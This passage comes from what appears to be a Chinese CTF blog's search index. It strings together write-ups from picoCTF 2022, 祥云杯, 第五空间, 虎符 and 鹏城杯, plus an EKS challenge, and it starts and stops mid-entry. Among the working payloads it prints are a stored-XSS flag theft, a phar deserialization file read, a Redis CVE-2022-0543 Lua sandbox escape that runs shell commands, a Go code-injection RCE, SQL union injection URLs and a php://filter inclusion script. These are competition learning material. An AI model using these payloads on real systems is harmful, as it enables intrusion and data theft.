可以创建debug-sa的token，但无法创建s3access-sa的token，他们的OIDC均为688655246681，解码也可以看到debug的aud为：oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589 符合Trust策略，因此可以让debug-sa来通过sts:AssumeRoleWithWebIdentity来扮演s3access-sa的challengeEksS3Role角色，其中token需要由sts.amazonaws.com颁发。 这样就让debug-sa切换到了s3access-sa的challengeEksS3Role角色，这样就可以获取flag了","link":"/2025/09/29/Wiz-EKS-Challenge%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"picoCTF-2022-复盘","text":"WEBnoted​ 题目给的是一个备忘录网站，创建用户后即可创建备忘录条目，同时还实现了一个bot，即用户提交网站后会被服务器端用chrome打开并访问。可以注意到，每一次在/repot提交url时，服务器都会先随机注册一个账号然后提交flag到备忘录，随后再访问用户提交的url。 12345678910111213141516171819202122232425let page = (await browser.pages())[0]await page.goto('http://0.0.0.0:8080/register');await page.type('[name=&quot;username&quot;]', crypto.randomBytes(8).toString('hex'));await page.type('[name=&quot;password&quot;]', crypto.randomBytes(8).toString('hex'));await Promise.all([ page.click('[type=&quot;submit&quot;]'), page.waitForNavigation({ waituntil: 'domcontentloaded' })]);await page.goto('http://0.0.0.0:8080/new');await page.type('[name=&quot;title&quot;]', 'flag');await page.type('[name=&quot;content&quot;]', process.env.FLAG ?? 'ctf{flag}');await Promise.all([ page.click('[type=&quot;submit&quot;]'), page.waitForNavigation({ waituntil: 'domcontentloaded' })]);await page.goto('about:blank')await page.goto(url);await page.waitForTimeout(7500);await browser.close(); 这里的bot是基于puppeteer实现的，页面访问使用的是page.goto，page.goto(url[, options])这个方法不仅可以直接类似于http://这类链接，而且还可以使用伪协议，类似于page.goto(data:text/html,自定义内容)，那么我们就可以在这里动手，直接让服务器把flag发送到我们自己的vps是。但是，答案是否定的，因为服务器端的账户并不能访问外网，这个方法是行不通的。 ​ 我们继续看一下views文件夹下的.ejs模板文件： 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;noted | my notes&lt;/title&gt; &lt;%- include('style') %&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;My Notes&lt;/h1&gt;&lt;hr&gt;&lt;% for (let note of notes) { %&gt;&lt;div&gt; &lt;h2&gt;&lt;%- note.title %&gt;&lt;/h2&gt; &lt;p&gt;&lt;%- note.content %&gt;&lt;/p&gt; &lt;form action=&quot;/delete&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;&lt;%- csrf %&gt;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;%- note.id %&gt;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Delete&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;hr&gt;&lt;% } %&gt;&lt;br&gt;&lt;a href='/new'&gt;New Note&lt;/a&gt; | &lt;a href='/report'&gt;Report&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 模板中note.title和note.content都是直接填充，也就是说这里是存在存储型xss的。所以就可以让服务器登录我们已知密码的账号，然后将flag提交到已知密码账号的备忘录中，随后我们登录该账号即可获取到flag。攻击流程如下图： 首先现在/register页面注册账户：账号为a密码为a，然后提交以下self-XSS内容到/new页面 12345678910&lt;iframe src=&quot;http://0.0.0.0:8080/new&quot; id=ifra&gt;&lt;/iframe&gt;&lt;script&gt; var flag = window.opener.document.body.textContent; ifra.onload = () =&gt; { ifra.onload = null; ifra.contentDocument.forms[0].title.value = 'flag'; ifra.contentDocument.forms[0].content.value = flag; ifra.contentDocument.forms[0].submit(); }&lt;/script&gt; 接着提交如下内容到/report 12345678data:text/html,&lt;script&gt; window.location = &quot;http://0.0.0.0:8080/notes&quot;; a = window.open('', ''); a.document.body.innerHTML = `&lt;form action=&quot;http://0.0.0.0:8080/login&quot; method=&quot;post&quot; name=xp id=xp target=&quot;_blank&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;a&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;a&quot;&gt;&lt;/form&gt;`; a.document.xp.submit(); a.location.href = &quot;http://0.0.0.0:8080/notes&quot;;&lt;/script&gt; 提交后等待几秒后再次访问已知密码的账户的/notes页面即可获取到flag","link":"/2022/04/05/picoCTF-2022-%E5%A4%8D%E7%9B%98/"},{"title":"祥云杯初赛-2022-WP","text":"WebRustWaf题目给出源码 app.js 123456789101112131415161718192021222324const express = require('express');const app = express();const bodyParser = require(&quot;body-parser&quot;)const fs = require(&quot;fs&quot;)app.use(bodyParser.text({ type: '*/*' }));const { execFileSync } = require('child_process');app.post('/readfile', function(req, res) { let body = req.body.toString(); let file_to_read = &quot;app.js&quot;; const file = execFileSync('/app/rust-waf', [body], { encoding: 'utf-8' }).trim(); try { file_to_read = JSON.parse(file) } catch (e) { file_to_read = file } let data = fs.readFileSync(file_to_read); res.send(data.toString());});app.get('/', function(req, res) { res.send('see `/src`'); });app.get('/src', function(req, res) { var data = fs.readFileSync('app.js'); res.send(data.toString());});app.listen(3000, function() { console.log('start listening on port 3000'); }); main.rs 12345678910111213141516171819202122232425262728293031323334353637383940414243444546use std::env;use serde::{Deserialize, Serialize};use serde_json::Value;static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;#[derive(Debug, Serialize, Deserialize)]struct File{ #[serde(default = &quot;default_protocol&quot;)] pub protocol: String, pub href: String, pub origin: String, pub pathname: String, pub hostname:String}pub fn default_protocol() -&gt; String { &quot;http&quot;.to_string()}//protocol is default value,can't be customizedpub fn waf(body: &amp;str) -&gt; String { if body.to_lowercase().contains(&quot;flag&quot;) || body.to_lowercase().contains(&quot;proc&quot;){ return String::from(&quot;./main.rs&quot;); } if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) { if let Some(json_body_obj) = json_body.as_object() { if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) { return String::from(&quot;./main.rs&quot;); } } //not contains protocol,check if struct is File if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) { return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;)); } } else{ //body not json return String::from(body); } return String::from(&quot;./main.rs&quot;);}fn main() { let args: Vec&lt;String&gt; = env::args().collect(); println!(&quot;{}&quot;, waf(&amp;args[1]));} 提供了一个文件读取功能，我们可以直接传输字符串也可以传json数据，传进去的内容会在main.rs中进行检查，如果罕有flag或者proc字符串就无法读取文件，对于满足条件的字符串会直接返回给app.js继续进行读取，而不含关键字的JSON数据将会进行解析，只有成功解析为File结构体时才会调用to_string函数输出返回给app.js进行下一步处理。 这里我们可以注意到，nodejs中的文件系统库fs中的readFileSync函数接受URL类的输入，而URL类的属性含有如下属性： 1234567891011121314const url=new URL(&quot;http://jututu.top&quot;);console.log(url.protocol);console.log(url.href);console.log(url.origin);console.log(url.pathname);console.log(url.hostname);/*output:http:http://jututu.top/http://jututu.top/jututu.top*/ 这些属性与main.rs中的结构体File是一致的。同时，我们可以注意到，to_string操作其实输出的也是一串JSON数据： 1234567891011121314151617181920212223242526272829use std::fs;use serde_json;use serde::{Deserialize, Serialize};#[derive(Debug, Serialize, Deserialize)]struct File{ pub protocol: String, pub href: String, pub origin: String, pub pathname: String, pub hostname:String}fn main() { let file=File{ protocol:&quot;http&quot;, href:&quot;http://jututu.top/&quot;, origin:&quot;http://jututu.top&quot;, pathname:&quot;/&quot;, hostname:&quot;jututu.top&quot; }; let sdata = serde_json::to_string(&amp;file); let sdata = sdata.unwrap(); println!(&quot;{}&quot;, sdata);}/*output:{&quot;protocol&quot;:&quot;http&quot;,&quot;href&quot;:&quot;http://jututu.top/&quot;,&quot;origin&quot;:&quot;http://jututu.top&quot;,&quot;pathname&quot;:&quot;/&quot;,&quot;hostname&quot;:&quot;jututu.top&quot;}*/ 而这一串JSON数据刚好能被app.js中的JSON.parse函数解析为URL对象，因此我们只需要按照格式输入结构体数据main.rs就会自动帮我们解析得到JSON数据从而被解析为URL对象。 而重点就在这里，readFileSync对输入的url会进行url解码（参考：https://brycec.me/posts/corctf_2022_challenges#simplewaf ），因此这里可以用url解码来绕过，将flag进行url编码或者部分url编码即可。 最终payload: 1234567891011121314151617POST /readfile HTTP/1.1Host: eci-2ze0xya70kbo4gq728da.cloudeci1.ichunqiu.com:3000Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/jsonContent-Length: 56[&quot;file:&quot;,&quot;file:///fl%61g&quot;,&quot;null&quot;,&quot;/fl%61g&quot;,&quot;&quot;] flag{88f45655-1050-4b00-a577-01fad53a9202}","link":"/2022/10/31/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/"},{"title":"第五空间-2022-WP","text":"web5_web_BaliYun访问www.zip 可以获取到源码，就两个文件，index.php和class.php index.php 12345678910&lt;?php include(&quot;class.php&quot;); if(isset($_GET['img_name'])){ $down = new check_img(); echo $down-&gt;img_check(); } if(isset($_FILES[&quot;file&quot;][&quot;name&quot;])){ $up = new upload(); echo $up-&gt;start(); } class.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpclass upload{ public $filename; public $ext; public $size; public $Valid_ext; public function __construct(){ $this-&gt;filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $this-&gt;ext = end(explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;])); $this-&gt;size = $_FILES[&quot;file&quot;][&quot;size&quot;] / 1024; $this-&gt;Valid_ext = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); } public function start(){ return $this-&gt;check(); } private function check(){ if(file_exists($this-&gt;filename)){ return &quot;Image already exsists&quot;; }elseif(!in_array($this-&gt;ext, $this-&gt;Valid_ext)){ return &quot;Only Image Can Be Uploaded&quot;; }else{ return $this-&gt;move(); } } private function move(){ move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$this-&gt;filename); return &quot;Upload succsess!&quot;; } public function __wakeup(){ echo file_get_contents($this-&gt;filename); }}class check_img{ public $img_name; public function __construct(){ $this-&gt;img_name = $_GET['img_name']; } public function img_check(){ if(file_exists($this-&gt;img_name)){ return &quot;Image exsists&quot;; }else{ return &quot;Image not exsists&quot;; } }} 有上传文件功能和检查文件是否存在功能，可以注意到class.php文件中有两个类，其中的upload类有文件读取： 123public function __wakeup(){ echo file_get_contents($this-&gt;filename); } __wakeup()是在反序列化过程中会自动调用的函数，也就是说只要我们能够触发反序列化就可以进行任意文件读取。同时check_img类有检查文件是否存在操作： 1234567public function img_check(){ if(file_exists($this-&gt;img_name)){ return &quot;Image exsists&quot;; }else{ return &quot;Image not exsists&quot;; }} 文件上传+反序列化，这就联想到了phar反序列化。可以上传phar文件，利用文件检查操作和phar伪协议触发反序列化，导致任意文件读取，phar文件生成代码如下： 12345678910111213141516171819202122232425&lt;?phpclass upload{ public $filename; public $ext; public $size; public $Valid_ext; public function __construct(){ $this-&gt;filename = '/flag'; $this-&gt;ext = ''; $this-&gt;size = 1024; $this-&gt;Valid_ext = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); }}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new upload();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; phar文件内容为： 12&lt;?php __HALT_COMPILER(); ?&gt;? \u0001 \u0011 \u0001 ? O:6:&quot;upload&quot;:4:{s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;s:3:&quot;ext&quot;;s:0:&quot;&quot;;s:4:&quot;size&quot;;i:1024;s:9:&quot;Valid_ext&quot;;a:4:{i:0;s:3:&quot;gif&quot;;i:1;s:4:&quot;jpeg&quot;;i:2;s:3:&quot;jpg&quot;;i:3;s:3:&quot;png&quot;;}}\b test.txt\u0004 ?(c\u0004 ~囟\u0001 testy^紮!q@SaD2&lt;5V苪\u0002 GBMB 上传文件后，发送如下报文触发： 123456789GET /?img_name=phar://./upload/phar.jpg HTTP/1.1Host: 39.107.76.202:24750Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close flag: flag{3QfNeV2JDk8wHKTgk5cHbynjC7HSXW5U}","link":"/2022/09/20/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2022-WP/"},{"title":"虎符CTF2022 WP Quest-RCE","text":"MiscQuest-RCE查看题目并进行搜索发现这是Redis 沙盒逃逸漏洞，CVE-2022-0543。 参考：https://www.adminxe.com/3620.html，利用package提供的方法加载动态链库的函数，进行任意命令执行。 payload如下： 1{&quot;query&quot;:&quot;SET \\&quot;dir\\&quot; \\&quot;/var/www/uploads/\\&quot; \\n eval 'local io_l = package.loadlib(\\&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\&quot;, \\&quot;luaopen_io\\&quot;); local io = io_l(); local f = io.popen(\\&quot;cat /flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG\\&quot;, \\&quot;r\\&quot;); local res = f:read(\\&quot;*a\\&quot;); f:close(); return res' 0&quot;} flag: HFCTF{34da8018-8720-42a0-95db-773a452ff1ee}","link":"/2022/03/20/%E8%99%8E%E7%AC%A6CTF2022-WP-Quest-RCE/"},{"title":"虎符决赛-2022-WP","text":"​ 期待已久的虎符决赛终于来了，本来是可以去福州旅游的，没想到主办方鸽了几个月之后直接改线上赛了！ ​ 决赛主要分为两个部分，分别是AWDP和PKS。实在不懂什么芯片的我们只能做做AWDP环节了，再加上这次我们没有pwn手吃了比较大的亏。好在修复成功了两道题和攻击成功一道题，靠着每轮一点点加分赶了上来不至于垫底。 readygo​ 这是一道go语言编写的题目，go题接触的比较少一开始拿到的时候有点慌。好在考的并不是语言特性，而是比较基础的代码注入。 源码主要文件目录如下： 1234567|——goeval@v0.1.1| |——eval.go| |——eval_test.go|——html| |——index.html| |——result.html|——main.go 首先看看main.go中的代码： 1234567891011121314151617181920212223242526272829303132package mainimport ( eval &quot;github.com/PaulXu-cn/goeval&quot; &quot;github.com/gin-gonic/gin&quot; &quot;regexp&quot;)func main() { r := gin.Default() r.LoadHTMLFiles(&quot;html/index.html&quot;, &quot;html/result.html&quot;) r.GET(&quot;/&quot;, func(c *gin.Context) { c.Header(&quot;server&quot;, &quot;Gin&quot;) c.HTML(200, &quot;index.html&quot;, &quot;&quot;) }) r.POST(&quot;/parse&quot;, func(c *gin.Context) { expression := c.DefaultPostForm(&quot;expression&quot;, &quot;666&quot;) Package := c.DefaultPostForm(&quot;Package&quot;, &quot;fmt&quot;) match, _ := regexp.MatchString(&quot;([a-zA-Z]+)&quot;, expression) if match { c.String(200, &quot;Hacker????&quot;) return } else { if res, err := eval.Eval(&quot;&quot;, &quot;fmt.Print(&quot;+expression+&quot;)&quot;, Package); nil == err { c.HTML(200, &quot;result.html&quot;, gin.H{&quot;result&quot;: string(res)}) } else { c.HTML(200, &quot;result.html&quot;, err.Error()) } } }) r.Run()} 从main函数中我们就可以大致了解这个web应用的主要结构和业务流程。html目录放置的是前端页面，访问index.html是一个提交计算表达式的表单，也就是一个计算器，表单提交后在服务器中由main.go中的代码进行处理，main.go会调用eval.go中的模块，而eval_test.go则是eval.go中模块的使用实例，main.go计算完之后将结果返回在result.html页面显示。 attack​ 从代码中可以看到，我们计算表达式会提交到/parse路进行进行处理，首先会对expression进行检查，拒绝对含有字母的表达式进行下一步处理，而对Package则并没有做任何检查。随后将expression与代码拼接后跟Package一起传入eval.go中的Eval()函数进行处理，以下是eval.go代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package goevalimport ( &quot;fmt&quot; &quot;go/format&quot; &quot;math/rand&quot; &quot;os&quot; &quot;os/exec&quot; &quot;strings&quot; &quot;time&quot;)const ( letterBytes = &quot;abcdefghijklmnopqrstuvwxyz&quot; letterIdxBits = 6 // 6 bits to represent a letter index letterIdxMask = 1&lt;&lt;letterIdxBits - 1 // All 1-bits, as many as letterIdxBits letterIdxMax = 63 / letterIdxBits // # of letter indices fitting in 63 bits)var ( dirSeparator = &quot;/&quot; tempDir = os.TempDir() src = rand.NewSource(time.Now().UnixNano()))// 参考： https://colobu.com/2018/09/02/generate-random-string-in-Go/func RandString(n int) string { b := make([]byte, n) // A src.Int63() generates 63 random bits, enough for letterIdxMax characters! for i, cache, remain := n-1, src.Int63(), letterIdxMax; i &gt;= 0; { if remain == 0 { cache, remain = src.Int63(), letterIdxMax } if idx := int(cache &amp; letterIdxMask); idx &lt; len(letterBytes) { b[i] = letterBytes[idx] i-- } cache &gt;&gt;= letterIdxBits remain-- } return string(b)}func Eval(defineCode string, code string, imports ...string) (re []byte, err error) { var ( tmp = `package main%s%sfunc main() {%s}` importStr string fullCode string newTmpDir = tempDir + dirSeparator + RandString(8) ) if 0 &lt; len(imports) { importStr = &quot;import (&quot; for _, item := range imports { if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd { importStr += fmt.Sprintf(&quot;\\n %s \\&quot;%s\\&quot;&quot;, item[:blankInd], item[blankInd+1:]) } else { importStr += fmt.Sprintf(&quot;\\n\\&quot;%s\\&quot;&quot;, item) } } importStr += &quot;\\n)&quot; } fullCode = fmt.Sprintf(tmp, importStr, defineCode, code) //fmt.Printf(&quot;%s&quot;, fullCode) var codeBytes = []byte(fullCode) // 格式化输出的代码 if formatCode, err := format.Source(codeBytes); nil == err { // 格式化失败，就还是用 content 吧 codeBytes = formatCode } // fmt.Println(string(codeBytes)) // 创建目录 if err = os.Mkdir(newTmpDir, os.ModePerm); nil != err { return } defer os.RemoveAll(newTmpDir) // 创建文件 tmpFile, err := os.Create(newTmpDir + dirSeparator + &quot;main.go&quot;) if err != nil { return re, err } defer os.Remove(tmpFile.Name()) // 代码写入文件 tmpFile.Write(codeBytes) tmpFile.Close() // 运行代码 cmd := exec.Command(&quot;go&quot;, &quot;run&quot;, tmpFile.Name()) res, err := cmd.CombinedOutput() res = codeBytes return res, err} Eval()函数主要做的事情是先对参数import进行分割，即对要导入的包进行格式化处理，随后要导入的包代码、变量声明代码、main函数主体代码插入到模板tmp中，再将这部分代码生成go文件并调用系统命令进行执行，最终将执行结果和错误返回。tmp模板插入相关代码后效果如下： 12345678910111213package main//这里是包导入代码，对应变量是importStr//格式为：//import (// &quot;fmt&quot;//)//这里是变量声明代码，对应参数defineCodefunc main() {//这里是main函数的主体代码，对应参数为code} 其中，importStr和code两个变量都是可控的，分别对应与Package和expression两个参数，也就是说我们可以通过控制Package和expression来将我们的恶意代码写入到这个文件中并在服务器上执行从而成功RCE。可以注意到，Package的内容并无限制，而expression则不能含有字母，要使代码成功执行必须将恶意代码写入到main函数中。这个时候就会想到可以控制Package这个参数来重新写一个main函数，然后再利用多行注释符将后续代码注释掉，从而实现代码注入。值得注意的是，go语言对语法要求较为严格，多行注释符必须要 /* 和 */ 成对出现，因此我们还需要控制expression将多行注释符和最后的右大括号 } 闭合起来，参数构造如下： 1234567891011121314var expression = &quot;*/_1(&quot;var Package = `&quot;fmt&quot;&quot;os/exec&quot;)func main(){cmd:=exec.Command(&quot;ls&quot;,&quot;/&quot;)res,err:=cmd.CombinedOutput()fmt.Printf(&quot;%s&quot;,res)fmt.Printf(&quot;%s&quot;,err)}func _1(){}func a(){/* 1` 嵌入到tmp代码模板之后效果如下： 12345678910111213141516171819202122package mainimport ( &quot;fmt&quot; &quot;os/exec&quot;)func main() { cmd := exec.Command(&quot;ls&quot;, &quot;/&quot;) res, err := cmd.CombinedOutput() fmt.Printf(&quot;%s&quot;, res) fmt.Printf(&quot;%s&quot;, err)}func _1() {}func a() { /* &quot;1&quot; ) func main() { fmt.Print(*/_1()} ​ 这里有几个小细节需要注意一下，第一就是Package注入的代码中不能含有空格，否则根据处理函数看，Package用空格分隔开后第二部分会被加上双引号，从而导致注入失败，这里可以用制表符代替空格，第二是为了闭合掉大括号和小括号，还需要在Package的最后定义函数来闭合最后的大括号并在函数中调用另一个函数来闭合小括号，因为闭合小括号需要控制expression来完成，因此这里的要定义函数名不含字母的函数，可以用下划线和数字来进行定义，在go中是允许这种定义方式的。 ​ 至此，我们就完成了对payload的构造，只需要将其url编码后发送即可。 fix​ 从上面的分析中我们可以看到漏洞出现的原因是对于参数检查不够严格，导致了前后文配合进行代码的注入，前文的注入离不开后文的括号闭合，只要我们将这个条件破坏即可抵抗代码注入攻击，从而修复成功。因此我们可以对expression的检查方法进行加固，将(、_符号加入黑名单即可，而/和*因为他们是四则运算符，将其禁用会影响正常功能，从而导致服务异常，因此不能加入黑名单，但是已经足够了，如果还不放心，保险一点可以将出去四则运算的其他标点符号加到黑名单中。 龙卷风​ 这道题是一道python环境下tornado框架的常规模板注入，题目中对注入点进行了惨无人道的过滤，黑名单非常长，感受一下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import tornado.ioloop, tornado.web, tornado.options, ossettings = {'static_path': os.path.join(os.getcwd(), 'static')}class IndexHandler(tornado.web.RequestHandler): def get(self): self.render(&quot;static/index.html&quot;) def post(self): if len(tornado.web.RequestHandler._template_loaders): for i in tornado.web.RequestHandler._template_loaders: tornado.web.RequestHandler._template_loaders[i].reset() msg = self.get_argument('tornado', '龙卷风摧毁停车场') black_func = ['eval', 'os', 'chr', 'class', 'compile', 'dir', 'exec', 'filter', 'attr', 'globals', 'help', 'input', 'local', 'memoryview', 'open', 'print', 'property', 'reload', 'object', 'reduce', 'repr', 'method', 'super', &quot;flag&quot;, &quot;file&quot;, &quot;decode&quot;,&quot;request&quot;,&quot;builtins&quot;,&quot;|&quot;,&quot;&amp;&quot;] black_symbol = [&quot;__&quot;, &quot;'&quot;, '&quot;', &quot;$&quot;, &quot;*&quot;, &quot;,&quot;, &quot;.&quot;,&quot;\\\\&quot;,&quot;0x&quot;,&quot;0o&quot;,&quot;/&quot;,&quot;+&quot;,&quot;*&quot;] black_keyword = ['or', 'while'] black_rce = ['render', 'module', 'include','if', 'extends', 'set', 'raw', 'try', 'except', 'else', 'finally', 'while', 'for', 'from', 'import', 'apply',&quot;True&quot;,&quot;False&quot;] if(len(msg)&gt;1500) : self.render('static/hack.html') return bans = black_func + black_symbol + black_keyword + black_rce for ban in bans: if ban in msg: self.render('static/hack.html') return with open('static/user.html', 'w') as (f): f.write( '&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;你使用 %s 摧毁了tornado&lt;/h1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;\\n' % msg) f.flush() self.render('static/user.html') if tornado.web.RequestHandler._template_loaders: for i in tornado.web.RequestHandler._template_loaders: tornado.web.RequestHandler._template_loaders[i].reset()def make_app(): return tornado.web.Application([('/', IndexHandler)], **settings)if __name__ == '__main__': app = make_app() app.listen(8888) tornado.ioloop.IOLoop.current().start() print('start') 能用的符号就只剩下#!@%^()_=[]{}:;?&gt;&lt;-~`，直接给我整不会了，蹲一波wp。 至于修补，那就是将恶心进行到底，把剩下的这些符号也加到黑名单中！！！","link":"/2022/07/23/%E8%99%8E%E7%AC%A6%E5%86%B3%E8%B5%9B-2022-WP/"},{"title":"鹏城杯初赛-2022-WP","text":"easygo给了源码，下下来打开发现存在sql注入 直接看数据库中的存在有什么表，其中有一个表比较可疑：super_secret_table 1/juice/1'%20union%20select%201,table_name%20from%20information_schema.tables%20limit%201offset%20§这个是偏移§-- 于是查看这个表的列名，发现存在flag字段： 1/juice/1'%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_name='super_secret_table'-- 直接读取flag 1/juice/1'%20union%20select%201,flag%20from%20super_secret_table-- flag:PCL{Postgresql_1njection_1s_3asY} 简单包含源码很简单就是通过文件包含读取flag 1234 &lt;?php highlight_file(__FILE__);include($_POST['flag']);//flag in /var/www/html/flag.php 但是存在waf，可以通过上传文件使得waf溢出失效，exp如下： 12345678import requestsurl = &quot;http://192.168.1.113/&quot;request_files = { 'file': (('demo.jpg', open('./image.jpg', 'rb')))}data={'flag': 'php://filter/convert.base64-encode/resource=/var/www/html/flag.php'}resp = requests.post(url=url, data=data,files=request_files)print(resp.content) flag: PCL{bc58644f-f757-11ec-9edf-5224002d2b29} easy_rsa第一步e和phi不互素： 12345678910111213141516c = 0x27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894ep = 0xbb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bdq = 0xbb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1e = 0x292def decrypt1(p, q, e, c): n = p * q phi = (p - 1) * (q - 1) t = gmpy2.gcd(e, phi) d = gmpy2.invert(e // t, phi) m = pow(c, d, n) msg = gmpy2.iroot(m, t) if msg[1]: print(long_to_bytes(msg[0]))decrypt1(p,q,e,c)# PCL{16745c3b 第二步p的高位攻击： 123456789101112131415161718192021222324# 先用sagemath求出q、pdef phase3(high_p, n): R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL') p = high_p + x x0 = p.small_roots(X = 2^60, beta = 0.1)[0] P = int(p(x0)) Q = n // P print(P) print(Q) assert n == P*Qp=0xa9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000n=0x841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65phase3(p,n)# python直接求出mp=119234372387564173916926418564504307771905987823894721284221707768770334474240277144999791051191061404002537779694672314673997030282474914206610847346023297970473719280866108677835517943804329212840618914863288766846702119011361533150365876285203805100986025166317939702179911918098037294325448226481818486521q=139862779248852876780236838155351435339041528333485708458669785004897778564234874018135441729896017420539905517964705602836874055417791439544162777504181482765029478481701166935117795286988835104239238153206137155845327225155932803904032184502243017645538314995056944419185855910939481260886933456330514972109phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)m=pow(c,d,n)print(long_to_bytes(m))# 0c134c83b74f 第三步c和n不互素，这里直接求公约数得到p，再求出m 123456789101112c = 